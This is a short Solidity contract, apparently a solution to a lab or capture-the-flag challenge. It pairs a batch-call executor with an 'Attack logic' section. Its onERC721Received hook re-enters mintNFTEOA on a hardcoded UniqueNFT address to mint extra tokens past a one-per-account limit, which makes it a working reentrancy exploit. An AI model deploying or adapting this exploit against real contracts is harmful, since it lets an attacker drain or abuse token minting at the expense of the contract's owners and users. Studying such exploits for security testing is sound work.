// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { UniqueNFT } from "./UniqueNFT.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SimpleDelegateContract is IERC721Receiver {
    event Executed(address indexed to, uint256 value, bytes data);

    struct Call {
        bytes data;
        address to;
        uint256 value;
    }

    // --- Attack logic ---
    // UniqueNFT address is hardcoded in onERC721Received

    // ERC721 Receiver hook
    function onERC721Received(
        address /*operator*/, 
        address /*from*/, 
        uint256 tokenId, 
        bytes calldata /*data*/
    ) external override returns (bytes4) {
        if (tokenId < 2) {
            // Re-enter mintNFTEOA to mint another NFT
            UniqueNFT(0xB8CF7547Fb6E6e5E9B456Dc12D126f2BAB26F9f1).mintNFTEOA();
        }
        return this.onERC721Received.selector;
    }

    // --- Original logic ---
    function execute(Call[] memory calls) external payable {
        for (uint256 i = 0; i < calls.length; i++) {
            Call memory call = calls[i];
            (bool success, bytes memory result) = call.to.call{value: call.value}(call.data);
            require(success, string(result));
            emit Executed(call.to, call.value, call.data);
        }
    }

    receive() external payable {}
}